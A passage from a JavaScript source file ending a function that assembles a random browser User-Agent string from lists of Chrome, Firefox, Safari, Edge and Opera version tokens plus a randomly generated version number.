    'Safari/537.25',
    'Edg/103.0.1264.71',
    'OPR/88.0.0.0',
    'Chrome/102.0.0.0 Safari/537.36',
    'Firefox/101.0',
    'Safari/537.24',
    'Edg/102.0.1245.44',
    'OPR/87.0.0.0',
    'Chrome/101.0.0.0 Safari/537.36',
    'Firefox/100.0',
    'Safari/537.23',
    'Edg/101.0.1210.53',
    'OPR/86.0.0.0',
    'Chrome/100.0.0.0 Safari/537.36',
    'Firefox/99.0',
    'Safari/537.22',
    'Edg/100.0.1185.50',
    'OPR/85.0.0.0',
    'Chrome/99.0.0.0 Safari/537.36',
    'Firefox/98.0',
    'Safari/537.21',
    'Edg/99.0.1150.55',
    'OPR/84.0.0.0',
    'Chrome/98.0.0.0 Safari/537.36',
    'Firefox/97.0',
    'Safari/537.20',
    'Edg/98.0.1108.62',
    'OPR/83.0.0.0',
    'Chrome/97.0.0.0 Safari/537.36',
    'Firefox/96.0',
    'Safari/537.19',
    'Edg/97.0.1072.76',
    'OPR/82.0.0.0',
    'Chrome/96.0.0.0 Safari/537.36',
    'Firefox/95.0',
    'Safari/537.18',
    'Edg/96.0.1054.62',
    'OPR/81.0.0.0'
  ];
  const versions = Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 1000) + '.' + Math.floor(Math.random() * 100);
  return `Mozilla/5.0 (${randomElement(osPlatforms)}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomElement(browsers)} ${versions}`;
}
